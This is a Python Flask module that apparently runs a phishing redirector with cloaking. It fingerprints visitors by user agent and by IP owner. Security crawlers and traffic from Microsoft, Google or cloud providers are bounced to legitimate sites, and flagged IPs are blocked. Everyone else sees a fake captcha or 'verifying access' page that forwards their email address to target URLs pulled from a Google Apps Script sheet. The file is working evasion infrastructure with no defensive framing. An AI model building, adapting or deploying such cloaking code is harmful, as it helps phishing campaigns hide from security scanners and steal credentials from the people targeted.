import random
import requests
import re
from flask import request, redirect, render_template

class RedirectHandler:
    def __init__(self):
        self.IPHUB_API_KEY = "YOUR_FREE_IPHUB_API_KEY"
        self.ABUSEIPDB_API_KEY = "YOUR_ABUSEIPDB_API_KEY"
        self.APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0AhJWPTmdqLvfSia1-gkSfNK5aTIQ95m83Q-kvIXukn_JxLXA/exec?action=getData&sheetname=REDIRECT&range=A1:F"
        self.FLAGGED_IPS = set()
        self.LEGITIMATE_DOMAINS = [
            "https://www.google.com",
            "https://www.office.com",
            "https://outlook.live.com",
            "https://www.microsoft.com",
            "https://www.bing.com",
            "https://www.yahoo.com"
        ]

    def is_bot_or_org(self, ip, user_agent, org_info):
        org_keywords = ['microsoft', 'google', 'amazon', 'digital ocean', 'azure',
                       'aws', 'oracle', 'facebook', 'twitter', 'linkedin']
        
        bot_patterns = [
            r'bot', r'crawler', r'spider', r'slurp', r'mediapartners',
            r'googleapis', r'chrome-lighthouse', r'pingdom', r'pagespeed'
        ]
        
        user_agent = user_agent.lower()
        org_info = org_info.lower() if org_info else ""
        
        if any(re.search(pattern, user_agent) for pattern in bot_patterns):
            return True
            
        if any(keyword in org_info for keyword in org_keywords):
            return True
            
        return False

    def is_ip_flagged(self, ip):
        if ip in self.FLAGGED_IPS:
            return True

        try:
            headers = {"X-Key": self.IPHUB_API_KEY}
            response = requests.get(f"https://v2.api.iphub.info/ip/{ip}", headers=headers)
            if response.status_code == 200 and response.json().get("block", 0) == 1:
                self.FLAGGED_IPS.add(ip)
                return True

            headers = {"Key": self.ABUSEIPDB_API_KEY, "Accept": "application/json"}
            response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}", headers=headers)
            if response.status_code == 200 and response.json().get("data", {}).get("abuseConfidenceScore", 0) > 50:
                self.FLAGGED_IPS.add(ip)
                return True
        except Exception as e:
            print("Error checking IP:", e)

        return False

    def fetch_redirect_data(self):
        try:
            response = requests.get(self.APPSCRIPT_URL)
            if response.status_code == 200:
                raw_data = response.json()
                if not isinstance(raw_data, list) or len(raw_data) < 2:
                    return []
                headers = raw_data[0]
                return [dict(zip(headers, row)) for row in raw_data[1:]]
        except Exception as e:
            print("Exception:", str(e))
        return []

    def generate_random_metadata(self):
        titles = ["Verifying Access", "Loading Secure Page", "Authentication Required"]
        descriptions = [
            "Please wait while we verify your request...",
            "Ensuring a secure browsing experience...",
            "Processing your request, please wait..."
        ]
        keywords = [
            "secure, verification, human check",
            "captcha, security, authentication",
            "bot protection, identity verification"
        ]
        
        return {
            "title": random.choice(titles),
            "description": random.choice(descriptions),
            "keywords": random.choice(keywords)
        }

    def handle_archive_path(self, num):
        data = self.fetch_redirect_data()
        redirect_map = {row['path']: row['redirectURL'] for row in data if row['redirectURL']}
        path = f'archive{num}'

        if path in redirect_map:
            redirect_url = redirect_map[path]
            email = request.args.get('email')
            if email:
                redirect_url = f"{redirect_url}?email={email}"
            return render_template('captcha.html', redirect_url=redirect_url)

        return render_template('error.html', message="Path not found"), 404

    def handle_premium_path(self, num):
        visitor_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        try:
            ip_info = requests.get(f'https://ipinfo.io/{visitor_ip}/json').json()
            org_info = ip_info.get('org', '')
            
            if self.is_bot_or_org(visitor_ip, user_agent, org_info):
                return redirect(random.choice(self.LEGITIMATE_DOMAINS))
                
        except Exception as e:
            print(f"Error checking IP info: {e}")

        if not user_agent or "bot" in user_agent.lower() or "crawler" in user_agent.lower():
            return render_template('error.html', message="Access denied: Suspicious activity detected"), 403

        if self.is_ip_flagged(visitor_ip):
            return render_template('error.html', message="Access denied: Suspicious activity detected"), 403

        data = self.fetch_redirect_data()
        redirect_map = {row['directory']: row['redirectURL'] for row in data if row['redirectURL']}
        path = f'directory{num}'

        if path in redirect_map:
            redirect_url = redirect_map[path]
            email = request.args.get('email', '')
            metadata = self.generate_random_metadata()

            return render_template(
                'redirect.html', 
                redirect_url=redirect_url, 
                email=email, 
                meta_title=metadata['title'], 
                meta_description=metadata['description'], 
                meta_keywords=metadata['keywords'],
                random_token=random.randint(100000, 999999)
            )

        return render_template('error.html', message="Path not found"), 404